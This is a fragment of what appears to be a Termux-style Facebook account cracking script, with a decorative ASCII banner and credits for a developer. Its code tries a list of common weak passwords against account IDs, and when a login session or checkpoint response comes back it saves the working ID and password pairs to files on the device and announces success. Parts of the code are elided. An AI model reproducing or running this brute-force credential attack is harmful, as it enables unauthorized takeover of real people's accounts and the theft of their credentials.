...
░░   ░▒ ░ ▓██ ░▒░ ░ ░ ▒  ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ...
 ░    ░   ░ ░         ░  ░    ░ ░           ░ 
          ░ ░                                ⠀⠀⠀⠀⠀⠀
\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═
\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92𝚖XYLON
[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92mABDULLHA
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
            ...
            if "session_key" in rp:
                ...
                open("/sdcard/Mr_K3SHAV-OLD-OK","a").write(uid+"|"+pw+"\n")
                os.system('espeak a-300 "OK ID"')
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r{G}SUCCESS {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/Mr_K3SHAV-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
